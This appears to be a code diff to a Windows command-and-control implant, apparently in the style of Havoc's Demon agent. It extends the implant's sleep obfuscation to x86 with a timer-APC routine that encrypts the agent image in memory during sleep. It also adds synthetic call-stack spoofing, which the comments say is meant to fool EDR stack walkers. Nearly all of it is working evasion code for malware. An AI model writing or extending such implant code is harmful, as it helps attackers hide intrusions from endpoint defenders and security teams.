@@ -2,6 +2,7 @@
 
 #include <common/Macros.h>
 #include <core/SleepObf.h>
+#include <core/Spoof.h>
 #include <core/Win32.h>
 #include <core/MiniStd.h>
 #include <core/Thread.h>
@@ -738,8 +739,6 @@ typedef struct _CRONOS_CTX
     BOOL     Done;      /* set to TRUE after decrypt completes */
 } CRONOS_CTX, *PCRONOS_CTX;
 
-#if _WIN64
-
 /*!
  * @brief
  *  Timer APC callback invoked on the main thread when the waitable timer
@@ -754,6 +753,8 @@ typedef struct _CRONOS_CTX
  *    5. Restore .text protection.
  *    6. Signal Done so the caller can detect completion.
  *
+ *  Works identically on x64 and x86 — no architecture-specific code.
+ *
  * @param ApcContext  Pointer to CRONOS_CTX allocated on the caller's stack.
  * @param LowValue    Timer expiry (low DWORD) — unused.
  * @param HighValue   Timer expiry (high DWORD) — unused.
@@ -765,7 +766,6 @@ VOID NTAPI CronosCallback(
 ) {
     PCRONOS_CTX Ctx      = ( PCRONOS_CTX ) ApcContext;
     ULONG       OldProt  = 0;
-    LARGE_INTEGER Delay  = { 0 };
 
     /* Step 1 — make agent image writable before encryption */
     Instance->Win32.VirtualProtect( Ctx->ImgBase, Ctx->ImgSize, PAGE_READWRITE, &OldProt );
@@ -788,8 +788,6 @@ VOID NTAPI CronosCallback(
     ( VOID ) LowValue;
     ( VOID ) HighValue;
 }
-
-#endif /* _WIN64 */
 
 /*!
  * @brief
@@ -896,9 +894,75 @@ LEAVE:
 
     return Success;
 
-#else /* x86 — fallback, no obfuscation */
-    Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );
-    return TRUE;
+#else /* x86 */
+
+    HANDLE      hTimer  = NULL;
+    CRONOS_CTX  Ctx     = { 0 };
+    LARGE_INTEGER DueTime = { 0 }; /* 0 = fire immediately */
+    NTSTATUS    NtStatus = STATUS_SUCCESS;
+    BOOL        Success  = FALSE;
+
+    Ctx.TimeOut  = TimeOut;
+    Ctx.ImgBase  = Instance->Session.ModuleBase;
+    Ctx.ImgSize  = Instance->Session.ModuleSize;
+    Ctx.Protect  = PAGE_EXECUTE_READWRITE;
+
+    if ( Instance->Session.TxtBase && Instance->Session.TxtSize ) {
+        Ctx.TxtBase = Instance->Session.TxtBase;
+        Ctx.TxtSize = Instance->Session.TxtSize;
+        Ctx.Protect = PAGE_EXECUTE_READ;
+    } else {
+        Ctx.TxtBase = Ctx.ImgBase;
+        Ctx.TxtSize = Ctx.ImgSize;
+    }
+
+    for ( BYTE i = 0; i < 16; i++ ) {
+        Ctx.Key[ i ] = RandomNumber32();
+    }
+
+    Ctx.KeyStr.Buffer        = Ctx.Key;
+    Ctx.KeyStr.Length        = Ctx.KeyStr.MaximumLength = sizeof( Ctx.Key );
+    Ctx.ImgStr.Buffer        = Ctx.ImgBase;
+    Ctx.ImgStr.Length        = Ctx.ImgStr.MaximumLength = Ctx.ImgSize;
+    Ctx.Done = FALSE;
+
+    if ( ! NT_SUCCESS( NtStatus = Instance->Win32.NtCreateTimer(
+        &hTimer, TIMER_ALL_ACCESS, NULL, SynchronizationTimer ) ) )
+    {
+        PRINTF( "NtCreateTimer failed: %lx\n", NtStatus )
+        goto LEAVE_X86;
+    }
+
+    if ( ! NT_SUCCESS( NtStatus = Instance->Win32.NtSetTimer(
+        hTimer, &DueTime,
+        C_PTR( CronosCallback ), &Ctx,
+        FALSE, 0, NULL ) ) )
+    {
+        PRINTF( "NtSetTimer failed: %lx\n", NtStatus )
+        goto LEAVE_X86;
+    }
+
+    NtStatus = SysNtWaitForSingleObject( hTimer, TRUE, NULL );
+    if ( NT_SUCCESS( NtStatus ) || NtStatus == (NTSTATUS)STATUS_USER_APC ) {
+        Success = Ctx.Done;
+    }
+
+    if ( ! Success ) {
+        PRINTF( "CronosObf/x86: callback did not complete (NtStatus=%lx Done=%d)\n",
+                NtStatus, Ctx.Done )
+    }
+
+LEAVE_X86:
+    if ( hTimer ) {
+        Instance->Win32.NtCancelTimer( hTimer, NULL );
+        SysNtClose( hTimer );
+        hTimer = NULL;
+    }
+
+    RtlSecureZeroMemory( Ctx.Key, sizeof( Ctx.Key ) );
+
+    return Success;
+
 #endif
 }
 
@@ -1034,16 +1098,45 @@ VOID SleepObf(
             break;
         }
 
-        /* default */
+        /* default — plain sleep with optional ARC-02 synthetic call stack */
         DEFAULT: case SLEEPOBF_NO_OBF: {}; default: {
-            SpoofFunc(
-                Instance->Modules.Kernel32,
-                IMAGE_SIZE( Instance->Modules.Kernel32 ),
-                Instance->Win32.WaitForSingleObjectEx,
-                NtCurrentProcess(),
-                C_PTR( TimeOut ),
-                FALSE
-            );
+            if ( Instance->Config.Implant.StackSpoof ) {
+                /* ARC-02: build synthetic call-stack frames on a shadow stack
+                 * so EDR stack walkers see a plausible kernel32 → ntdll chain. */
+                SYNTH_STACK_CTX SynthCtx = { 0 };
+
+                if ( SynthStackInit( &SynthCtx ) && SynthStackPrepare( &SynthCtx ) ) {
+                    PUTS( "[ARC-02] Sleeping with synthetic call stack" )
+                    SynthStackSleep(
+                        Instance->Win32.WaitForSingleObjectEx,
+                        NtCurrentProcess(),
+                        TimeOut,
+                        FALSE,
+                        &SynthCtx
+                    );
+                    SynthStackFree( &SynthCtx );
+                } else {
+                    PUTS( "[ARC-02] Synthetic stack setup failed, falling back to SpoofFunc" )
+                    SynthStackFree( &SynthCtx );
+                    SpoofFunc(
+                        Instance->Modules.Kernel32,
+                        IMAGE_SIZE( Instance->Modules.Kernel32 ),
+                        Instance->Win32.WaitForSingleObjectEx,
+                        NtCurrentProcess(),
+                        C_PTR( TimeOut ),
+                        FALSE
+                    );
+                }
+            } else {
+                SpoofFunc(
+                    Instance->Modules.Kernel32,
+                    IMAGE_SIZE( Instance->Modules.Kernel32 ),
+                    Instance->Win32.WaitForSingleObjectEx,
+                    NtCurrentProcess(),
+                    C_PTR( TimeOut ),
+                    FALSE
+                );
+            }
         }
     }
 
@@ -1056,9 +1149,41 @@ VOID SleepObf(
 
 #else
 
-    // TODO: add support for sleep obf and spoofing
+    /* x86: dispatch on technique, then fall back to ARC-02 / plain sleep */
+    switch ( Technique )
+    {
+        /* ARC-03: Cronos — timer-APC on calling thread, no thread suspension */
+        case SLEEPOBF_CRONOS: {
+            if ( CronosObf( TimeOut ) ) {
+                break;
+            }
+            /* fall through to default on failure */
+        }
 
-    Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );
+        /* default — ARC-02 synthetic call stack or plain sleep */
+        default: {
+            if ( Instance->Config.Implant.StackSpoof ) {
+                SYNTH_STACK_CTX_X86 SynthCtx86 = { 0 };
+
+                if ( SynthStackInit86( &SynthCtx86 ) && SynthStackPrepare86( &SynthCtx86 ) ) {
+                    PUTS( "[ARC-02/x86] Sleeping with synthetic call stack" )
+                    SynthStackSleep86(
+                        Instance->Win32.WaitForSingleObjectEx,
+                        NtCurrentProcess(),
+                        TimeOut,
+                        FALSE,
+                        &SynthCtx86
+                    );
+                    SynthStackFree86( &SynthCtx86 );
+                } else {
+                    SynthStackFree86( &SynthCtx86 );
+                    Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );
+                }
+            } else {
+                Instance->Win32.WaitForSingleObjectEx( NtCurrentProcess(), TimeOut, FALSE );
+            }
+        }
+    }
 
 #endif
 
